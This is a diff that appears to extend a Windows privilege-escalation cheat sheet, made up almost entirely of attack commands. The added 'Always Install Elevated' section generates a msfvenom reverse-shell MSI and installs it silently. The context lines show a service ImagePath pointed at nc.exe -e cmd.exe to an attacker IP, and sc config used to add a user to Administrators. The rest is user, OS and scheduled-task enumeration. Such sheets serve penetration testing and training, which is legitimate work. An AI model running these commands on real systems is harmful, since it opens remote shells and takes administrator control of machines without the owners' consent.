@@ -210,6 +210,7 @@ C:\> net accounts /domain
 C:\> net user
 C:\> net user /domain
 C:\> net user <username> /domain
+PS C:\> Get-LocalUser
 C:\> net localgroup
 C:\> net localgroup administrators
 C:\> net localgroup administrators /domain
@@ -227,6 +228,7 @@ C:\> net view /domain
 C:\> netdom query /domain:<domain> trust
 C:\> netdom query /domain:<domain> dc
 C:\> netdom query /domain:<domain> workstation
+C:\> Get-WmiObject -Class Win32_OperatingSystem | select Description
 C:\> hostname
 C:\> [System.Environment]::OSVersion.Version
 C:\> [Environment]::OSVersion.Version
@@ -1877,6 +1879,15 @@ C:\> accesschk.exe /accepteula "<username>" -kvuqsw hklm\System\CurrentControlSe
 C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\<username>\Downloads\nc.exe -e cmd.exe <IP address> <port>"
 ```
 
+- Always Install Elevated
+
+```
+C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address> LPORT=<port> -f msi > aie.msi
+C:\> msiexec /i c:\Users\Public\Desktop\aie.msi /quiet /qn /norestart
+```
+
 - PATH Variable
 
 ```
@@ -2254,6 +2265,12 @@ C:\> icacls "<file"
 C:\> icacls "<file>" /grant <username>:F
 ```
 
+- Directory Ownership
+
+```
+C:\> .\accesschk64.exe /accepteula -s -d C:\Scripts\
+```
+
 - Hidden Files
 
 ```
@@ -2436,6 +2453,13 @@ C:\> PsService.exe security AppReadiness
 C:\> sc config AppReadiness binPath= "cmd /c net localgroup Administrators <username> /add"
 C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 PS C:\> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+```
+
+- Scheduled Tasks
+
+```
+C:\> schtasks /query /fo LIST /v
+PS C:\> Get-ScheduledTask | select TaskName,State
 ```
 
 - Registry
